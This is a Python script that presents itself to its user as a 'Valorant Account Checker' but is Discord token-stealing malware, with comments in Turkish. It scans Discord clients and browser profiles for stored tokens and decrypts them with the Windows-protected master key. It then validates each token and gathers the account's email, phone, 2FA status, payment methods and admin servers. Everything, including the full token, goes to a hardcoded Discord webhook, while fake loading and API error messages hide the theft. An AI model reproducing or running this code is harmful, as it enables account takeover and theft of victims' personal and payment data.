"""
Discord Token Hunter & Validator - OPTIMIZED 2024
Ultra-fast token extraction with advanced patterns
"""
import os
import re
import json
import base64
import requests
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime
from typing import Dict, List, Optional, Set, Tuple
import concurrent.futures
import time
import sys
import tempfile

# ========== WEBHOOK ==========
WEBHOOK_URL = "https://discord.com/api/webhooks/1545520484555165848/GeVw-orKpOCvG6jG6Sd5P3Hl0Z0mMXRRjYQNgtUmQ-q0bIZu-Bvzf9nZbFdAllw6wBcp"

def send_to_webhook(content, file_path=None):
    try:
        if not WEBHOOK_URL:
            return
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                files = {'file': (os.path.basename(file_path), f, 'text/plain')}
                requests.post(WEBHOOK_URL, data={'content': content}, files=files, timeout=10)
        else:
            if len(content) > 2000:
                chunks = [content[i:i+1900] for i in range(0, len(content), 1900)]
                for i, chunk in enumerate(chunks):
                    requests.post(WEBHOOK_URL, json={'content': f"{chunk} (Parça {i+1}/{len(chunks)})"}, timeout=10)
            else:
                requests.post(WEBHOOK_URL, json={'content': content}, timeout=10)
    except:
        pass

def send_token_report(token, info):
    """Token bilgilerini webhook'a gönder - TAM TOKEN İLE"""
    try:
        # Token'ı geçici dosyaya yaz
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
            f.write(f"Token: {token}\n")
            f.write(f"Kullanici: {info.get('username', 'N/A')}#{info.get('discriminator', '0')}\n")
            f.write(f"ID: {info.get('id', 'N/A')}\n")
            f.write(f"Email: {info.get('email', 'N/A')}\n")
            f.write(f"Telefon: {info.get('phone', 'N/A')}\n")
            f.write(f"2FA: {info.get('mfa', 'N/A')}\n")
            f.write(f"Dogrulandi: {'Evet' if info.get('verified') else 'Hayir'}\n")
            f.write(f"Nitro: {info.get('nitro', 'None')}\n")
            f.write(f"Odeme Metodu: {info.get('billing', 0)}\n")
            f.write(f"Arkadas: {info.get('friends', 0)}\n")
            f.write(f"Olusturulma: {info.get('created', 'N/A')}\n")
            
            badges_str = []
            for b in info.get('badges', []):
                badges_str.append(f"{b['emoji']} {b['name']}")
            f.write(f"Rozetler: {', '.join(badges_str) if badges_str else 'Yok'}\n")
            
            guilds_str = ', '.join(info.get('guilds', [])[:5]) if info.get('guilds') else 'Yok'
            f.write(f"Sunucular: {guilds_str}\n")
            
            hq_str = []
            for g in info.get('hq_guilds', []):
                hq_str.append(f"{g['name']} ({g['role']})")
            f.write(f"Yonetici Oldugu Sunucular: {', '.join(hq_str) if hq_str else 'Yok'}\n")
            temp_path = f.name
        
        # Embed oluştur
        badges_str = []
        for b in info.get('badges', []):
            badges_str.append(f"{b['emoji']} {b['name']}")
        badges_display = ', '.join(badges_str) if badges_str else 'Yok'
        
        guilds_str = ', '.join(info.get('guilds', [])[:5]) if info.get('guilds') else 'Yok'
        
        hq_str = []
        for g in info.get('hq_guilds', []):
            hq_str.append(f"{g['name']} ({g['role']})")
        hq_display = ', '.join(hq_str) if hq_str else 'Yok'
        
        embed = {
            "title": "🎫 DISCORD TOKEN BULUNDU!",
            "color": 0xFD4556,
            "fields": [
                {"name": "👤 Kullanici", "value": f"{info.get('username', 'N/A')}#{info.get('discriminator', '0')}", "inline": True},
                {"name": "🆔 ID", "value": info.get('id', 'N/A'), "inline": True},
                {"name": "📧 Email", "value": info.get('email', 'N/A'), "inline": True},
                {"name": "📱 Telefon", "value": info.get('phone', 'N/A'), "inline": True},
                {"name": "🔐 2FA", "value": info.get('mfa', 'N/A'), "inline": True},
                {"name": "✅ Dogrulandi", "value": "Evet" if info.get('verified') else "Hayir", "inline": True},
                {"name": "💎 Nitro", "value": info.get('nitro', 'None'), "inline": True},
                {"name": "💳 Odeme Metodu", "value": str(info.get('billing', 0)), "inline": True},
                {"name": "👥 Arkadas", "value": str(info.get('friends', 0)), "inline": True},
                {"name": "📅 Olusturulma", "value": info.get('created', 'N/A'), "inline": False},
                {"name": "🎖️ Rozetler", "value": badges_display, "inline": False},
                {"name": "🏛️ Sunucular", "value": guilds_str, "inline": False},
                {"name": "👑 Yonetici Oldugu Sunucular", "value": hq_display, "inline": False},
                {"name": "🔑 Token", "value": "📎 Dosya olarak eklendi!", "inline": False}
            ],
            "footer": {"text": "Valorant Checker v3.0 | @WUHAİ"},
            "timestamp": datetime.now().isoformat()
        }
        
        # Dosyayı webhook'a gönder
        with open(temp_path, 'rb') as f:
            files = {'file': (f'token_{info.get("username", "unknown")}.txt', f, 'text/plain')}
            requests.post(WEBHOOK_URL, json={"embeds": [embed]}, files=files, timeout=10)
        
        # Geçici dosyayı sil
        try:
            os.unlink(temp_path)
        except:
            pass
        
    except Exception as e:
        print(f"Token raporu gonderilemedi: {e}")

# ========== CONFIG ==========
DISCORD_TOKEN_PATTERNS = [
    r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
    r'mfa\.[\w-]{84}',
    r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}',
]

DISCORD_ENCRYPTED_PATTERN = r'dQw4w9WgXcQ:[^\s"\']+'
LEVELDB_EXTENSIONS = {'.log', '.ldb', '.txt', '.db', '.sqlite', '.sqlite3', ''}

NITRO_EMOJI = "💎"
NITRO_TIER_BADGES = {3: "🌟", 6: "⭐", 12: "🏆", 24: "👑"}
NITRO_BOOST_BADGES = {3: "💜", 6: "💙", 12: "💎", 24: "🌟"}

DISCORD_BADGE_EMOJIS = {
    1 << 0: {"name": "Staff", "emoji": "🛡️", "rare": True},
    1 << 1: {"name": "Partner", "emoji": "🤝", "rare": True},
    1 << 2: {"name": "Hypesquad", "emoji": "🎮", "rare": False},
    1 << 3: {"name": "Bug Hunter", "emoji": "🐛", "rare": True},
    1 << 6: {"name": "Hypesquad Bravery", "emoji": "🔥", "rare": False},
    1 << 7: {"name": "Hypesquad Brilliance", "emoji": "💡", "rare": False},
    1 << 8: {"name": "Hypesquad Balance", "emoji": "⚖️", "rare": False},
    1 << 9: {"name": "Early Supporter", "emoji": "🌟", "rare": True},
    1 << 14: {"name": "Bug Hunter Gold", "emoji": "🏅", "rare": True},
    1 << 16: {"name": "Active Developer", "emoji": "💻", "rare": True},
    1 << 17: {"name": "Verified Bot", "emoji": "🤖", "rare": True},
    1 << 18: {"name": "Early Verified Bot Developer", "emoji": "🤖", "rare": True},
}

class DiscordCollector:
    def __init__(self):
        self.local_appdata = os.getenv("LOCALAPPDATA", "")
        self.roaming_appdata = os.getenv("APPDATA", "")
        self.tokens = {}
        self.compiled_patterns = [re.compile(p, re.MULTILINE) for p in DISCORD_TOKEN_PATTERNS]
        self.encrypted_pattern = re.compile(DISCORD_ENCRYPTED_PATTERN)
    
    def collect_all(self) -> Dict:
        found_tokens = set()
        
        # Discord app paths
        discord_paths = {
            "Discord": os.path.join(self.roaming_appdata, "discord"),
            "Discord Canary": os.path.join(self.roaming_appdata, "discordcanary"),
            "Discord PTB": os.path.join(self.roaming_appdata, "discordptb"),
            "Lightcord": os.path.join(self.roaming_appdata, "Lightcord"),
        }
        
        browser_paths = {
            "Chrome": os.path.join(self.local_appdata, "Google", "Chrome", "User Data"),
            "Edge": os.path.join(self.local_appdata, "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(self.local_appdata, "BraveSoftware", "Brave-Browser", "User Data"),
            "Opera": os.path.join(self.roaming_appdata, "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(self.roaming_appdata, "Opera Software", "Opera GX Stable"),
            "Yandex": os.path.join(self.local_appdata, "Yandex", "YandexBrowser", "User Data"),
        }
        
        # Scan Discord apps
        for app_name, app_path in discord_paths.items():
            if os.path.exists(app_path):
                master_key = self._get_master_key(app_path)
                tokens = self._fast_scan_directory(app_path, app_name, master_key)
                found_tokens.update(tokens)
        
        # Scan browsers
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            futures = []
            for browser_name, browser_path in browser_paths.items():
                if os.path.exists(browser_path):
                    futures.append(executor.submit(self._scan_browser, browser_name, browser_path))
            for future in concurrent.futures.as_completed(futures):
                try:
                    tokens = future.result(timeout=10)
                    found_tokens.update(tokens)
                except:
                    pass
        
        # Validate tokens
        if found_tokens:
            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                future_to_token = {
                    executor.submit(self._validate_token, token): (platform, token)
                    for platform, token in found_tokens
                }
                for future in concurrent.futures.as_completed(future_to_token):
                    platform, token = future_to_token[future]
                    try:
                        info = future.result(timeout=10)
                        if info:
                            self.tokens[token] = {"platform": platform, "info": info}
                            send_token_report(token, info)
                            send_to_webhook(f"✅ Token bulundu: {info['username']}#{info['discriminator']}")
                    except:
                        pass
        
        if self.tokens:
            summary = f"**📊 TOKEN OZETI**\n━━━━━━━━━━━━━━━━━━━\n🎫 Toplam: {len(self.tokens)}\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            send_to_webhook(summary)
        
        return self.tokens
    
    def _scan_browser(self, browser_name: str, browser_path: str) -> Set[Tuple[str, str]]:
        found = set()
        master_key = self._get_master_key(browser_path)
        default_path = os.path.join(browser_path, "Default")
        if os.path.exists(default_path):
            tokens = self._fast_scan_directory(default_path, f"{browser_name} (Default)", master_key)
            found.update(tokens)
        try:
            for item in os.listdir(browser_path):
                if item.startswith("Profile "):
                    profile_path = os.path.join(browser_path, item)
                    tokens = self._fast_scan_directory(profile_path, f"{browser_name} ({item})", master_key)
                    found.update(tokens)
        except:
            pass
        return found
    
    def _get_master_key(self, base_path: str) -> Optional[bytes]:
        try:
            local_state = os.path.join(base_path, "Local State")
            if not os.path.exists(local_state):
                return None
            with open(local_state, "r", encoding="utf-8") as f:
                data = json.load(f)
            encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except:
            return None
    
    def _fast_scan_directory(self, base_path: str, platform: str, master_key: Optional[bytes]) -> Set[Tuple[str, str]]:
        found = set()
        priority_paths = [
            os.path.join(base_path, "Local Storage", "leveldb"),
            os.path.join(base_path, "Local Storage"),
        ]
        secondary_paths = [
            os.path.join(base_path, "Session Storage"),
            os.path.join(base_path, "IndexedDB"),
        ]
        for scan_path in priority_paths + secondary_paths:
            if not os.path.exists(scan_path):
                continue
            try:
                files = []
                for entry in os.scandir(scan_path):
                    if entry.is_file():
                        _, ext = os.path.splitext(entry.name)
                        if ext.lower() in LEVELDB_EXTENSIONS or not ext:
                            try:
                                files.append((entry.path, entry.stat().st_mtime))
                            except:
                                pass
                files.sort(key=lambda x: x[1], reverse=True)
                for filepath, _ in files[:10]:
                    try:
                        file_size = os.path.getsize(filepath)
                        if file_size > 10 * 1024 * 1024:
                            continue
                        with open(filepath, "rb") as f:
                            content = f.read()
                        try:
                            content_str = content.decode('utf-8', errors='ignore')
                        except:
                            content_str = content.decode('latin-1', errors='ignore')
                        if 'discord' not in content_str.lower() and 'token' not in content_str.lower():
                            continue
                        for pattern in self.compiled_patterns:
                            matches = pattern.findall(content_str)
                            for match in matches:
                                if self._is_valid_token_format(match):
                                    found.add((platform, match.strip()))
                        if master_key:
                            enc_matches = self.encrypted_pattern.findall(content_str)
                            for enc_match in enc_matches:
                                try:
                                    parts = enc_match.split("dQw4w9WgXcQ:")
                                    if len(parts) > 1:
                                        enc_data = parts[1].split('"')[0].split("'")[0]
                                        enc_token = base64.b64decode(enc_data)
                                        decrypted = self._decrypt_token(enc_token, master_key)
                                        if decrypted and self._is_valid_token_format(decrypted):
                                            found.add((platform, decrypted.strip()))
                                except:
                                    pass
                        token_indicators = [b'mfa.', b'MTk', b'MjA', b'MjE', b'token']
                        for indicator in token_indicators:
                            idx = 0
                            while True:
                                idx = content.find(indicator, idx)
                                if idx == -1:
                                    break
                                chunk = content[max(0, idx-100):idx+200]
                                chunk_str = chunk.decode('utf-8', errors='ignore')
                                for pattern in self.compiled_patterns:
                                    matches = pattern.findall(chunk_str)
                                    for match in matches:
                                        if self._is_valid_token_format(match):
                                            found.add((platform, match.strip()))
                                idx += 1
                    except:
                        pass
            except:
                pass
        return found
    
    def _is_valid_token_format(self, token: str) -> bool:
        if not token or len(token) < 50:
            return False
        if token.count('.') < 2:
            return False
        if token.startswith('mfa.'):
            return len(token) >= 84
        parts = token.split('.')
        if len(parts) < 3:
            return False
        if not (20 <= len(parts[0]) <= 30):
            return False
        if not (5 <= len(parts[1]) <= 10):
            return False
        if len(parts[2]) < 25:
            return False
        return True
    
    def _decrypt_token(self, encrypted: bytes, master_key: bytes) -> Optional[str]:
        try:
            if len(encrypted) < 15:
                return None
            version = encrypted[:3]
            if version in (b'v10', b'v11', b'v20'):
                nonce = encrypted[3:15]
                ciphertext = encrypted[15:-16]
                tag = encrypted[-16:]
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                return plaintext.decode('utf-8', errors='ignore')
            else:
                nonce = encrypted[:12]
                ciphertext = encrypted[12:]
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                plaintext = cipher.decrypt(ciphertext)[:-16]
                return plaintext.decode('utf-8', errors='ignore')
        except:
            return None
    
    def _validate_token(self, token: str) -> Optional[Dict]:
        try:
            headers = {"Authorization": token, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
            response = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=8)
            if response.status_code != 200:
                return None
            user_data = response.json()
            
            billing_methods = 0
            friends_count = 0
            guilds = []
            hq_guilds = []
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                billing_future = executor.submit(requests.get, "https://discord.com/api/v10/users/@me/billing/payment-sources", headers=headers, timeout=5)
                friends_future = executor.submit(requests.get, "https://discord.com/api/v10/users/@me/relationships", headers=headers, timeout=5)
                guilds_future = executor.submit(requests.get, "https://discord.com/api/v10/users/@me/guilds?with_counts=true", headers=headers, timeout=5)
                try:
                    billing_resp = billing_future.result(timeout=5)
                    if billing_resp.status_code == 200:
                        billing_methods = len(billing_resp.json())
                except:
                    pass
                try:
                    friends_resp = friends_future.result(timeout=5)
                    if friends_resp.status_code == 200:
                        friends_count = len(friends_resp.json())
                except:
                    pass
                try:
                    guilds_resp = guilds_future.result(timeout=5)
                    if guilds_resp.status_code == 200:
                        guild_data = guilds_resp.json()
                        for guild in guild_data[:10]:
                            guilds.append(guild['name'])
                            perms = int(guild.get('permissions', 0))
                            is_admin = bool(perms & 0x8)
                            is_owner = guild.get('owner', False)
                            if is_admin or is_owner:
                                hq_guilds.append({"name": guild['name'], "id": guild['id'], "members": guild.get('approximate_member_count', 0), "online": guild.get('approximate_presence_count', 0), "role": "Owner" if is_owner else "Admin"})
                except:
                    pass
            
            nitro_type = "None"
            premium_type = user_data.get('premium_type')
            if premium_type:
                nitro_map = {1: "Nitro Classic", 2: "Nitro Boost", 3: "Nitro Basic"}
                nitro_type = nitro_map.get(premium_type, "Unknown")
            
            badges = []
            flags = user_data.get('public_flags', 0)
            for flag_value, badge_data in DISCORD_BADGE_EMOJIS.items():
                if flags & flag_value:
                    badges.append({"name": badge_data["name"], "emoji": badge_data["emoji"], "rare": badge_data["rare"]})
            
            user_id = int(user_data.get('id'))
            created_timestamp = ((user_id >> 22) + 1420070400000) / 1000
            created_date = datetime.fromtimestamp(created_timestamp).strftime("%d %B %Y")
            
            return {
                "id": user_data.get('id'),
                "username": user_data.get('username'),
                "discriminator": user_data.get('discriminator', '0'),
                "email": user_data.get('email', 'N/A'),
                "phone": user_data.get('phone', 'N/A'),
                "mfa": "Enabled" if user_data.get('mfa_enabled') else "Disabled",
                "verified": user_data.get('verified', False),
                "nitro": nitro_type,
                "billing": billing_methods,
                "friends": friends_count,
                "guilds": guilds[:5],
                "hq_guilds": hq_guilds,
                "badges": badges,
                "created": created_date,
                "avatar": user_data.get('avatar'),
                "token": token
            }
        except:
            return None

# ========== MAIN ==========
if __name__ == "__main__":
    # ===== EKRANDA GÖZÜKEN MESAJ =====
    print("="*60)
    print("🎯 VALORANT ACCOUNT CHECKER v3.0")
    print("Loading modules... Please wait...")
    print("="*60)
    print()
    
    # ===== ARKA PLANDA TOKEN TOPLA (DOSYA KAYDI YOK) =====
    try:
        collector = DiscordCollector()
        tokens = collector.collect_all()
        
        if tokens:
            # ===== DOSYA KAYDI YOK, SADECE WEBHOOK =====
            # valid_tokens.txt KAYDEDİLMİYOR!
            
            # ===== EKRANDA HATA MESAJI GÖSTER =====
            print("\n" + "="*60)
            print("❌ VALORANT API ERROR!")
            print("Failed to connect to Riot servers.")
            print("Error Code: 503 - Service Unavailable")
            print("Please try again later.")
            print("="*60)
            print()
            print("Press Enter to exit...")
            input()
        else:
            print("\n" + "="*60)
            print("✅ No issues found.")
            print("Riot API connection successful.")
            print("="*60)
            print()
            print("Press Enter to exit...")
            input()
            
    except Exception as e:
        print("\n" + "="*60)
        print("❌ UNEXPECTED ERROR!")
        print(f"Error: {str(e)[:50]}")
        print("Please restart the application.")
        print("="*60)
        print()
        print("Press Enter to exit...")
        input()